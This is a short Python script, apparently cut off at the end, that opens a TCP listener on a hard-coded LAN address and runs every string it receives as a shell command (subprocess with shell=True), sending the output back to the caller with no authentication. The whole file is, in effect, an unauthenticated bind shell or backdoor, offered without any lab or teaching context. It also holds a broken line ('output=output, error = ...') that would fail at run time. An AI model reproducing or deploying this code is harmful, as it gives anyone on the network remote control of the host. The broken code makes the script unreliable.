import socket
import subprocess

def run_command(command):
    # Execute the command and retrieve the output
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output, error = process.communicate()

    # Return the output and error as strings
    return output.decode(), error.decode()

def start_server(host, port):
    # Create a socket object
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # Bind the socket to a specific host and port
        s.bind((host, port))

        # Listen for incoming connections
        s.listen(1)
        print("Server listening on {}:{}".format(host, port))

        while True:
            # Accept a connection from a client
            conn, addr = s.accept()
            print("Connection established from {}:{}".format(addr[0], addr[1]))

            # Receive the command from the client
            command = conn.recv(1024).decode()

            # Execute the command
            output=output, error = run_command(command)

            # Send the output back to the client
            conn.sendall(output.encode())

            # Close the connection
            conn.close()
            print("Connection closed from {}:{}".format(addr[0], addr[1]))

    finally:
        # Close the socket
        s.close()

# Replace the following variables with the appropriate values
host = '192.168.1.45'  # IP address to bind the server (0.0.0.0 for all interfaces)
port = 12345  # Port number to establish the 
